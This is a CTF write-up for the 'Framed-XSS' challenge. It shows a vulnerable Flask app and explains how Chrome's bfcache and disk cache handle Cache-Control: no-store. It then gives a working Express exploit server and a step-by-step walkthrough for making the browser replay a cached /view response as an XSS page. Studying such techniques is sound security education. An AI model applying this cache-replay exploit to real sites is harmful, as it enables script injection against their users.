# Framed-XSS

This challenge is an another XSS that based on browser caching (bfcache/diskcache), to solve this challenge we need to know about chrome cache handling



here the web application

```python
from flask import Flask, request

app = Flask(__name__)


@app.get("/")
def index():
    return """
<body>
  <h1>XSS Challenge</h1>
  <form action="/">
    <textarea name="html" rows="4" cols="36"></textarea>
    <button type="submit">Render</button>
  <form>
  <script type="module">
    const html = await fetch("/view" + location.search, {
      headers: { "From-Fetch": "1" },
    }).then((r) => r.text());
    if (html) {
      document.forms[0].html.value = html;
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "");
      iframe.srcdoc = html;
      document.body.append(iframe);
    }
  </script>
</body>
    """.strip()


@app.get("/view")
def view():
    if not request.headers.get("From-Fetch", ""):
        return "Use fetch", 400
    return request.args.get("html", "")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=3000)

```


And the headless chrome will just visit the given url as well


# Description

As you can see the `/` endpoint will retrive the `?html` query parameter and make a request to `/view` plus the *From-Fetch* header and then pass the response to a **sandboxed iframe**, so there is not proper way to achive xss here (as i know).

And in the **/view** endpoint, you have xss. but only if you pass the *From-Fetch*. so you can't just pass the `http://web/view?html=payload` to admin directly

So the main idea is to somehow cache and `/view?html=payload` response into the browser and somehow trigger the browser to retrieve it from cache instead of make another request


# bfcache

bfcache stands for backward/forward cache, and it occurs when you click on the back/forward button on your browser or by running this js codes
```js
window.history.back()
window.history.forward()
window.history.go(?delta)
```

When you click back/forward buttons or execute above js codes, chrome will just response the cached response from diskcache unless you explicity say to chrome to don't cache the response and make request every time, and that is possible via the `Cache-Control` response header that comes from server

>note: if the server don't return this Cache-Control header, chrome will cache the response by default


### Cache-Control
- **no-cache**: browser makes *conditional request* to check whether or not it should use cache - ([ref](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Conditional_requests))
- **no-store**: server tells browser to not store the response into cache 
- **max-age**: the maximum age that the cache is **fresh** or become **stale** - ([ref](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching#fresh_and_stale_based_on_age))


So if the server send `Cache-Control: no-store` to browser, the browser will not make the cache, and in the bfcache scenario, as the browser didn't cache the response it make another request to the server

But the important part is that if your server send `no-store` and after backward to your server in browser. the browser will make another request due to `no-store` cache-control, but will use diskcache as much as possible, so if your server redirect you to another origin that is already cached, the browser will use the cache if it's exists


# Solution

```js
const express = require("express");

const app = express();
let flag = false;

let payload = 'http://example.com'

app.get("/set", (req, res) => {
  flag = req.query.value === "true";
  res.send("ok");
});

app.get("/exp", (req, res) => {
  res.set('Cache-Control','no-store')
  if (flag) {
    console.log("redirection")
    res.redirect("http://127.0.0.1:3000/view?html=lol");
  } else 
 res.send(`
<script>
let x = window.open('/second')
fetch('/set?value=true')
window.open(\`http://127.0.0.1:3000/?html=lol\`)
setTimeout(_=>location = 'about:blank',2000)
</script>
`)
});


app.get('/second',(req,res)=>{
    res.send(`<script>

setTimeout(_=>opener.history.back(),3000)
</script>`)
})
app.listen(5000);
```

As you can see when you open `http://127.0.0.1:5000/exp`

1. first, it will respond with the *else* block, cuz the flag is false
2. it will set the flag to true via `/set?value=troe`
3. so the content will open */second* that will return back the `window.opener` in 3sec
4. also will open `http://127.0.0.1:3000?html=lol` that is the challenge website
5. in the opened window, the challenge itself make fetch request to /view that is cached by default
6. and after 2sec we will redirect to `about:blank`
7. and the `/second` opended window will return the opener that is the `about:blank` via the `history.back()`
8. as the chrome will not hit the cache (because of `no-store` in the cache-control), it will make another request to `/exp` and now as the flag is true, it will redirect us to the `/view?html=lol` that is already cached via the `fetch` inside the opended challenge
9. so chrome will use diskcache and returns the `lol` as response

>note: lol is your xss payload

# Refrences
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control
- https://developer.mozilla.org/en-US/docs/Web/API/Request/cache
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching#fresh_and_stale_based_on_age
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Conditional_requests